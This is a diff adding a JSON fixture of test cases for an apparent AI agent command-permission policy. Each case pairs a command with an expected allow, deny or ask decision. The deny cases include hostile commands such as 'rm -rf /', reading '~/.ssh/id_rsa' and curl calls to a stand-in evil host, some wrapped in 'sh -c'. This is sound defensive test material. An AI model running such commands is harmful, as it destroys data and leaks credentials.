@@ -1,0 +1,111 @@
+[
+  {
+    "name": "safe_go_test",
+    "tool": "workspace_exec",
+    "backend": "workspace_exec",
+    "command": "go test ./...",
+    "expect_decision": "allow"
+  },
+  {
+    "name": "dangerous_delete",
+    "tool": "exec_command",
+    "backend": "hostexec",
+    "command": "rm -rf /",
+    "expect_decision": "deny",
+    "expect_rule": "cmd.dangerous_delete"
+  },
+  {
+    "name": "read_secret",
+    "tool": "workspace_exec",
+    "backend": "workspace_exec",
+    "command": "cat ~/.ssh/id_rsa",
+    "expect_decision": "deny",
+    "expect_rule": "fs.read_secret"
+  },
+  {
+    "name": "net_non_whitelist",
+    "tool": "workspace_exec",
+    "backend": "workspace_exec",
+    "command": "curl http://evil.example.com/x",
+    "expect_decision": "deny",
+    "expect_rule": "net.non_whitelist"
+  },
+  {
+    "name": "net_whitelist",
+    "tool": "workspace_exec",
+    "backend": "workspace_exec",
+    "command": "curl https://proxy.golang.org/list",
+    "expect_decision": "allow"
+  },
+  {
+    "name": "shell_wrapper_bypass",
+    "tool": "workspace_exec",
+    "backend": "workspace_exec",
+    "command": "sh -c 'curl http://evil.example.com'",
+    "expect_decision": "deny",
+    "expect_rule": "shell.interpreter_inline"
+  },
+  {
+    "name": "pipe_command",
+    "tool": "workspace_exec",
+    "backend": "workspace_exec",
+    "command": "cat data.txt | grep foo",
+    "expect_decision": "allow"
+  },
+  {
+    "name": "dependency_install",
+    "tool": "workspace_exec",
+    "backend": "workspace_exec",
+    "command": "pip install requests",
+    "expect_decision": "ask",
+    "expect_rule": "deps.install"
+  },
+  {
+    "name": "long_running",
+    "tool": "workspace_exec",
+    "backend": "workspace_exec",
+    "command": "sleep 100000",
+    "expect_decision": "ask",
+    "expect_rule": "res.timeout_exceeds"
+  },
+  {
+    "name": "output_flood",
+    "tool": "workspace_exec",
+    "backend": "workspace_exec",
+    "command": "yes",
+    "expect_decision": "ask",
+    "expect_rule": "res.output_flood"
+  },
+  {
+    "name": "hostexec_long_session",
+    "tool": "exec_command",
+    "backend": "hostexec",
+    "command": "tail -f /var/log/app.log",
+    "expect_decision": "ask",
+    "expect_rule": "host.long_session"
+  },
+  {
+    "name": "ask_human_review",
+    "tool": "workspace_exec",
+    "backend": "workspace_exec",
+    "command": "go install golang.org/x/tools/cmd/stringer@latest",
+    "expect_decision": "ask",
+    "expect_rule": "deps.install"
+  },
+  {
+    "name": "host_privilege",
+    "tool": "exec_command",
+    "backend": "hostexec",
+    "command": "sudo apt install nginx",
+    "expect_decision": "deny",
+    "expect_rule": "host.privilege"
+  },
+  {
+    "name": "secret_inline",
+    "tool": "workspace_exec",
+    "backend": "workspace_exec",
+    "command": "deploy --token=AKIAIOSFODNN7EXAMPLE",
+    "expect_decision": "deny",
+    "expect_rule": "secret.inline"
+  }
+]
